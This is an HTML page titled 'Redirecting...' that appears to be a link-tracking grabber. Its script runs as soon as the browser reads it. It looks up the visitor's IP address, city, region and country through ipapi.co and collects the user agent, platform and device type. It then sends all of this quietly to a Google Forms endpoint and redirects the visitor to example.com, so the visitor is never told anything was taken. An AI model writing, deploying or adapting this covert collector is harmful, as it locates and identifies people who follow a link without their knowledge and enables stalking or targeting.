<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <script>
        // Set the destination URL
        const REDIRECT_URL = "https://example.com";

        // This function contains the logic
        function initRedirectAndCapture() {
            // Start sending data in the background
            fetch('https://ipapi.co/json/')
                .then(response => response.json())
                .then(geoData => {
                    const timestamp = new Date().toISOString();
                    const userAgent = navigator.userAgent;
                    const os = navigator.platform;

                    let deviceInfo = 'Unknown';
                    if (navigator.userAgentData) {
                        const platform = navigator.userAgentData.platform;
                        const isMobile = navigator.userAgentData.mobile ? 'Mobile' : 'Desktop';
                        deviceInfo = `${platform} (${isMobile})`;
                    } else {
                        const isMobile = /Mobi/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
                        deviceInfo = `${navigator.platform} (${isMobile})`;
                    }

                    const formData = new FormData();
                    formData.append("entry.1496883719", timestamp);
                    formData.append("entry.1535774579", geoData.ip);
                    formData.append("entry.2067837825", os);
                    formData.append("entry.747657848", deviceInfo);
                    formData.append("entry.1734202770", `${geoData.city}, ${geoData.region}, ${geoData.country_name}`);
                    formData.append("entry.448354724", userAgent);

                    fetch("https://docs.google.com/forms/d/e/1FAIpQLSehg2hY3VPki5je6DE8lAmLPcXTGdk4ReZ7FCGxX_SZ3OJ0yg/formResponse", {
                        method: "POST",
                        body: formData,
                        mode: "no-cors"
                    });
                })
                .catch(err => console.error(err));

            // Redirect the user immediately
            window.location.href = REDIRECT_URL;
        }

        // --- NEW: Call the function immediately ---
        // This runs as soon as the script is read by the browser, instead of waiting for the page to load.
        initRedirectAndCapture();
    </script>
</head>
<body>
    </body>
</html>
